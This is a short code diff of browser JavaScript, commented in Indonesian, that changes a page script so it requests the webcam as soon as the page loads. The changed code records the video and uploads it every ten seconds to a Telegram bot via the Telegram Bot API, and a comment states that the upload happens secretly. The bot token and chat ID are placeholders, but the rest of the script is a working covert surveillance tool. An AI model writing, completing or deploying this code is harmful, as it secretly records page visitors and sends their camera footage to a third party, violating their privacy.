@@ -1,20 +1,17 @@
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
-const ctx = canvas.getContext("2d");
-
-async function startCamera() {
+document.addEventListener("DOMContentLoaded", async function () {
     try {
+        // Meminta akses kamera saat halaman pertama kali dibuka
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        sendToTelegram(stream);
+        document.getElementById("video").srcObject = stream;
+        sendToTelegram(stream); // Kirim ke Telegram diam-diam
     } catch (error) {
         console.error("Gagal mengakses kamera:", error);
     }
-}
+});
 
 async function sendToTelegram(stream) {
-    const botToken = "YOUR_BOT_TOKEN";
-    const chatId = "YOUR_CHAT_ID";
+    const botToken = "YOUR_BOT_TOKEN"; // Ganti dengan token bot Anda
+    const chatId = "YOUR_CHAT_ID"; // Ganti dengan chat ID Anda
     const url = `https://api.telegram.org/bot${botToken}/sendVideo`;
 
     const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
@@ -34,6 +31,4 @@ async function sendToTelegram(stream) {
 
     mediaRecorder.start();
     setInterval(() => mediaRecorder.requestData(), 10000); // Kirim video setiap 10 detik
-}
-
-startCamera();
+        }
